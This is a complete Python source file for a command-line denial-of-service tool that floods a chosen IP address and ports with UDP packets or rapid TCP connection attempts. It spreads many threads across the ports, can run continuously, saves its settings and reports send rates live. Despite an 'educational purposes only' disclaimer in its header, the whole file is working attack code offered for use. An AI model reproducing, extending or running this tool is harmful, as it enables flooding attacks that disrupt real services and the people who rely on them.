import os
import time
import socket
import random
import threading
import argparse
import json
import sys

LICENSE = """
# DDoS Script (Educational Purposes Only)
# Copyright (c) 2023 SSL-ACTX
# Licensed under the MIT License

# Disclaimer: This script is provided for educational purposes only.
# It includes UDP Flood and TCP SYN Flood methods.
# Using this script to attack targets without prior mutual consent is illegal
# and unethical. The author is not responsible for any misuse or damage
# caused by this script. Use responsibly and only on systems you have explicit permission to test.
"""

# --- Configuration ---
APP_CONFIG_DIR_NAME = 'dds_script'
CONFIG_FILE_NAME = 'dds_config.json'
CONFIG_DIR_PATH = os.path.join(os.path.expanduser('~'), '.config', APP_CONFIG_DIR_NAME)
CONFIG_FILE_PATH = os.path.join(CONFIG_DIR_PATH, CONFIG_FILE_NAME)

def get_default_config():
    """Returns the default configuration structure."""
    return {
        'last_method': 'udp',
        'last_threads': 10,
        'last_packets': 5000,
        'default_ports': [80, 443],
        'udp_packet_size': 2048
    }

def load_config():
    """Loads configuration from the JSON file."""
    config = get_default_config()
    if os.path.exists(CONFIG_FILE_PATH):
        try:
            with open(CONFIG_FILE_PATH, 'r') as f:
                loaded_config = json.load(f)
                # Update default config with loaded values
                config.update(loaded_config)
        except json.JSONDecodeError:
            print(f"{Colors.WARNING}Warning: Could not decode JSON from {CONFIG_FILE_PATH}. Using default config.{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.WARNING}Warning: Could not read config file {CONFIG_FILE_PATH}: {e}. Using default config.{Colors.ENDC}")
    return config

def save_config(config):
    """Saves the current configuration to the JSON file."""
    try:
        os.makedirs(CONFIG_DIR_PATH, exist_ok=True)
        with open(CONFIG_FILE_PATH, 'w') as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        print(f"{Colors.WARNING}Warning: Could not save config file {CONFIG_FILE_PATH}: {e}{Colors.ENDC}")

# --- UI/Output ---
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def show_ascii_header():
    header = r"""
   _____   __    __                 __
  /  _  \_/  |__/  |______    ____ |  | __
 /  /_\  \   __\   __\__  \ _/ ___\|  |/ /
/    |    \  |  |  |  / __ \\  \___|    <
\____|__  /__|  |__| (____  /\___  >__|_ \
        \/                \/     \/     \/
        Use at your own risk!
    """
    print(Colors.HEADER + header + Colors.ENDC)
    print(LICENSE)

def countdown():
    print("\n" + Colors.OKGREEN + "Starting attack in...", end="", flush=True)
    for i in range(3, 0, -1):
        print(f" {i}", end="", flush=True)
        time.sleep(1)
    print(" Go!" + Colors.ENDC)

# --- Attack Logic ---
class AttackThread(threading.Thread):
    def __init__(self, ip, port, attack_method, udp_packet_size, num_packets_per_thread, continuous):
        super().__init__()
        self.ip = ip
        self.port = port
        self.attack_method = attack_method
        self.udp_packet_size = udp_packet_size
        self.num_packets_per_thread = num_packets_per_thread
        self.continuous = continuous
        self.packets_sent = 0
        self.stop_event = threading.Event()
        # Socket is created inside run() because socket objects are not safely shareable across threads

    def run(self):
        try:
            if self.attack_method == 'udp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes_to_send = random._urandom(self.udp_packet_size)
                sent = 0
                # Loop while stop event is not set AND (continuous OR packet limit not reached)
                while not self.stop_event.is_set() and (self.continuous or sent < self.num_packets_per_thread):
                    try:
                        sock.sendto(bytes_to_send, (self.ip, self.port))
                        sent += 1
                        self.packets_sent += 1
                    except socket.error:
                        # Ignore transient UDP errors
                        pass

            elif self.attack_method == 'tcp':
                sent = 0
                # Loop while stop event is not set AND (continuous OR packet limit not reached)
                while not self.stop_event.is_set() and (self.continuous or sent < self.num_packets_per_thread):
                    try:
                        # Create a new socket for each connection attempt in SYN flood
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.setblocking(False)

                        try:
                            sock.connect((self.ip, self.port))
                        except BlockingIOError:
                            # This is the expected result for a non-blocking connect attempt (SYN packet sent)
                            sent += 1
                            self.packets_sent += 1
                        except socket.error:
                            # Ignore other connection errors for flooding speed
                            pass
                        finally:
                             # Crucially close the socket after the attempt
                             sock.close()

                    except Exception:
                        pass

            else:
                 print(f"\n{Colors.FAIL}Invalid attack method: {self.attack_method}{Colors.ENDC}", flush=True)
                 self.stop_event.set()

        except Exception as e:
            print(f"\n{Colors.FAIL}Thread error for {self.ip}:{self.port}: {e}{Colors.ENDC}", flush=True)
        finally:
            # Close the UDP socket if it was created
            if self.attack_method == 'udp' and 'sock' in locals() and sock:
                 sock.close()

    def stop(self):
        """Signals the thread to stop."""
        self.stop_event.set()

def report_progress(threads, continuous, attack_method):
    """Reports the total packets/connections sent by all active threads."""
    try:
        start_time = time.time()
        total_packets_sent_at_last_update = 0
        last_update_time = time.time()
        item_type = "Connections" if attack_method == 'tcp' else "Packets"

        # Loop while any thread is alive
        while any(thread.is_alive() for thread in threads):
            current_time = time.time()
            current_total_sent = sum(thread.packets_sent for thread in threads)
            elapsed_total = current_time - start_time
            elapsed_since_last_update = current_time - last_update_time

            rate = (current_total_sent - total_packets_sent_at_last_update) / elapsed_since_last_update if elapsed_since_last_update > 0 else 0
            avg_rate = current_total_sent / elapsed_total if elapsed_total > 0 else 0

            mode_status = "Continuous" if continuous else "Limited Count"
            print(
                f"Attack Status | Mode: {mode_status:<13} | Method: {attack_method.upper():<3} | "
                f"Active Threads: {sum(thread.is_alive() for thread in threads):<3} | "
                f"Total {item_type:<11}: {current_total_sent:<10,} | Current Rate: {rate:,.0f}/{item_type[0]}ps | Avg Rate: {avg_rate:,.0f}/{item_type[0]}ps",
                end='\r', flush=True
            )

            total_packets_sent_at_last_update = current_total_sent
            last_update_time = current_time

            time.sleep(0.5)

        # Final report after threads finish or are stopped
        final_total_sent = sum(thread.packets_sent for thread in threads)
        final_elapsed_time = time.time() - start_time
        final_avg_rate = final_total_sent / final_elapsed_time if final_elapsed_time > 0 else 0

        print(
             f"Attack Status | Mode: {'Finished' if not continuous else 'Stopped ':<13} | Method: {attack_method.upper():<3} | "
             f"Active Threads: 0   | "
             f"Total {item_type:<11}: {final_total_sent:<10,} | Current Rate: {'N/A':<7} | Average Rate: {final_avg_rate:,.0f}/{item_type[0]}ps"
        )

    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Progress reporting interrupted.{Colors.ENDC}", flush=True)
    except Exception as e:
        print(f"\n{Colors.FAIL}Error during progress reporting: {e}{Colors.ENDC}", flush=True)

def attack(ip, ports, num_threads, total_packets, continuous, attack_method, udp_packet_size):
    """Manages the attack by creating and running threads."""
    threads = []
    total_ports = len(ports)

    if num_threads <= 0:
        print(f"{Colors.FAIL}Error: Number of threads must be positive.{Colors.ENDC}", flush=True)
        return

    if not ports:
        print(f"{Colors.FAIL}Error: No ports specified for attack.{Colors.ENDC}", flush=True)
        return

    # Thread Distribution: Distribute threads as evenly as possible across ports
    threads_distribution = {}
    if num_threads < total_ports:
        for i in range(num_threads):
             threads_distribution[ports[i]] = 1
        for i in range(num_threads, total_ports):
             threads_distribution[ports[i]] = 0
    else:
        base_threads_per_port = num_threads // total_ports
        remaining_threads = num_threads % total_ports
        for i, port in enumerate(ports):
            threads_distribution[port] = base_threads_per_port + (1 if i < remaining_threads else 0)

    total_threads_assigned = sum(threads_distribution.values())
    print(f"\n{Colors.OKBLUE}Distributing {num_threads} threads ({attack_method.upper()} method) among {total_ports} ports: {threads_distribution} (Total assigned: {total_threads_assigned}){Colors.ENDC}", flush=True)
    if total_threads_assigned != num_threads:
         print(f"{Colors.WARNING}Warning: Thread distribution discrepancy. Requested: {num_threads}, Assigned: {total_threads_assigned}{Colors.ENDC}", flush=True)

    # Packet/Connection Distribution (if not continuous)
    count_per_thread = 0
    if not continuous:
        if total_packets is None or total_packets <= 0:
             print(f"{Colors.FAIL}Error: Total count must be positive for non-continuous mode.{Colors.ENDC}", flush=True)
             return
        if total_threads_assigned > 0:
            count_per_thread = total_packets // total_threads_assigned
            if count_per_thread == 0: count_per_thread = 1 # Ensure at least 1 packet/connection per thread
        else:
             print(f"{Colors.FAIL}Error: No threads were assigned despite request.{Colors.ENDC}", flush=True)
             return

    item_type_label = "connections" if attack_method == 'tcp' else "packets"
    if not continuous and count_per_thread > 0:
         print(f"{Colors.OKBLUE}Distributing {total_packets} total {item_type_label}: {count_per_thread} {item_type_label} per thread.{Colors.ENDC}", flush=True)

    # Create and Start Threads
    actual_threads_started = 0
    for port, num_threads_this_port in threads_distribution.items():
        if num_threads_this_port > 0:
            for _ in range(num_threads_this_port):
                thread = AttackThread(
                    ip,
                    port,
                    attack_method,
                    udp_packet_size,
                    count_per_thread,
                    continuous
                )
                thread.daemon = True # Allows program to exit even if threads are running
                thread.start()
                threads.append(thread)
                actual_threads_started += 1

    if not threads:
        print(f"{Colors.WARNING}No attack threads were started. Please check parameters and thread distribution.{Colors.ENDC}", flush=True)
        return

    print(f"\n{Colors.OKGREEN}Successfully started {actual_threads_started} attack threads.{Colors.ENDC}", flush=True)

    report_progress(threads, continuous, attack_method)


# --- Main Function ---
def main():
    show_ascii_header()

    config = load_config()
    default_config = get_default_config()

    parser = argparse.ArgumentParser(
        description="Simple UDP/TCP DDoS script (Educational Purposes Only).\n"
                    f"Configuration saved in {CONFIG_FILE_PATH}\n"
                    f"Methods: udp (UDP Flood), tcp (TCP SYN Flood)",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("ip", help="Target IP address")

    # Argument group for --auto vs manual settings
    group = parser.add_mutually_exclusive_group()
    group.add_argument(
        "-a", "--auto",
        action="store_true",
        help=f"Use parameters from config ({CONFIG_FILE_NAME}: default ports, last method, last threads, last packets, udp packet size) and attack continuously."
    )
    group.add_argument(
        "-p", "--ports",
        help="Target ports (comma-separated, e.g., 80,443). Required unless --auto is used."
    )

    parser.add_argument(
        "-m", "--method",
        choices=['udp', 'tcp'],
        default=config.get('last_method', default_config['last_method']),
        help=f"Attack method (default: %(default)s from config or {default_config['last_method']}). Choices: %(choices)s"
    )
    parser.add_argument(
        "-t", "--threads",
        type=int,
        help="Number of threads to use. Required unless --auto is used."
    )
    parser.add_argument(
        "-n", "--count",
        type=int,
        help="Total number of packets (UDP) or connection attempts (TCP) across all threads. Required unless --auto or --cont is used."
    )
    parser.add_argument(
        "--udp-packet-size",
        type=int,
        default=config.get('udp_packet_size', default_config['udp_packet_size']),
        help=f"Size of each UDP packet in bytes (default: %(default)s from config or {default_config['udp_packet_size']}). Ignored for TCP method."
    )
    parser.add_argument(
        "--cont",
        action="store_true",
        help="Run attack continuously (ignores -n/--count parameter)."
    )

    args = parser.parse_args()

    # Determine parameters based on --auto or manual args
    ip = args.ip
    ports = []
    num_threads = None
    total_count = None
    continuous = args.cont
    attack_method = args.method
    udp_packet_size = args.udp_packet_size

    if args.auto:
        print(f"{Colors.OKBLUE}Using parameters from config file {CONFIG_FILE_PATH} (--auto){Colors.ENDC}", flush=True)
        ports = config.get('default_ports', default_config['default_ports'])
        attack_method = config.get('last_method', default_config['last_method'])
        num_threads = config.get('last_threads', default_config['last_threads'])
        udp_packet_size = config.get('udp_packet_size', default_config['udp_packet_size'])
        continuous = True
        total_count = None

        if not ports:
             print(f"{Colors.FAIL}Error: 'default_ports' not found or empty in config for --auto mode. Please specify ports manually or update config.{Colors.ENDC}", flush=True)
             sys.exit(1)
        if num_threads is None or num_threads <= 0:
             print(f"{Colors.FAIL}Error: 'last_threads' not found or invalid in config for --auto mode ({num_threads}). Please specify threads manually or update config.{Colors.ENDC}", flush=True)
             sys.exit(1)
        if attack_method not in ['udp', 'tcp']:
             print(f"{Colors.FAIL}Error: Invalid 'last_method' in config for --auto mode ({attack_method}). Must be 'udp' or 'tcp'.{Colors.ENDC}", flush=True)
             sys.exit(1)

    else: # Manual mode
        # Validate required manual arguments
        if args.ports is None:
             print(f"{Colors.FAIL}Error: --ports is required unless --auto is used.{Colors.ENDC}", flush=True)
             parser.print_help()
             sys.exit(1)
        if args.threads is None:
             print(f"{Colors.FAIL}Error: --threads is required unless --auto is used.{Colors.ENDC}", flush=True)
             parser.print_help()
             sys.exit(1)
        if not continuous and args.count is None:
             print(f"{Colors.FAIL}Error: --count is required unless --auto or --cont is used.{Colors.ENDC}", flush=True)
             parser.print_help()
             sys.exit(1)

        # Parse and Validate manual ports string
        try:
            ports_str_list = args.ports.split(',')
            ports = [int(p.strip()) for p in ports_str_list if p.strip()]
            if not ports: raise ValueError("No valid ports found after parsing")
        except ValueError as e:
            print(f"{Colors.FAIL}Error parsing ports: {e}. Please use comma-separated integers (e.g., 80,443).{Colors.ENDC}", flush=True)
            sys.exit(1)

        num_threads = args.threads
        total_count = args.count if not continuous else None

        # Basic validation for manual parameters
        if num_threads <= 0:
            print(f"{Colors.FAIL}Error: Number of threads must be positive ({num_threads}).{Colors.ENDC}", flush=True)
            sys.exit(1)
        if not continuous and (total_count is None or total_count <= 0):
             print(f"{Colors.FAIL}Error: Total count must be positive when not running continuously ({total_count}).{Colors.ENDC}", flush=True)
             sys.exit(1)
        if attack_method == 'udp' and (udp_packet_size is None or udp_packet_size <= 0):
            print(f"{Colors.FAIL}Error: UDP packet size must be positive ({udp_packet_size}).{Colors.ENDC}", flush=True)
            sys.exit(1)

    # Save last used configuration if not running --auto
    if not args.auto:
        config['last_method'] = attack_method
        config['last_threads'] = num_threads
        config['last_packets'] = total_count if total_count is not None else config['last_packets'] # Only update if a specific count was given
        config['udp_packet_size'] = udp_packet_size # Always save current UDP packet size
        # config['default_ports'] is not updated by manual mode
        save_config(config)

    print(f"{Colors.OKGREEN}Target IP: {ip}{Colors.ENDC}", flush=True)
    print(f"{Colors.OKGREEN}Target Port(s): {ports}{Colors.ENDC}", flush=True)
    print(f"{Colors.OKGREEN}Attack Method: {attack_method.upper()}{Colors.ENDC}", flush=True)
    print(f"{Colors.OKGREEN}Threads: {num_threads}{Colors.ENDC}", flush=True)
    if continuous:
        print(f"{Colors.OKGREEN}Mode: Continuous (Ctrl+C to stop){Colors.ENDC}", flush=True)
    else:
        print(f"{Colors.OKGREEN}Total {'Packets' if attack_method == 'udp' else 'Connections'}: {total_count}{Colors.ENDC}", flush=True)

    if attack_method == 'udp':
        print(f"{Colors.OKGREEN}UDP Packet Size: {udp_packet_size} bytes{Colors.ENDC}", flush=True)


    countdown()

    try:
        attack(ip, ports, num_threads, total_count, continuous, attack_method, udp_packet_size)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Attack interrupted by user (Ctrl+C). Exiting...{Colors.ENDC}", flush=True)
    except Exception as e:
        print(f"\n{Colors.FAIL}An unexpected error occurred during attack execution: {e}{Colors.ENDC}", flush=True)
    finally:
        print(f"\n{Colors.OKBLUE}Attack finished or stopped.{Colors.ENDC}", flush=True)
        # Ensure the progress line is cleared
        print("\r" + " " * 150 + "\r", end="", flush=True)


if __name__ == "__main__":
    main()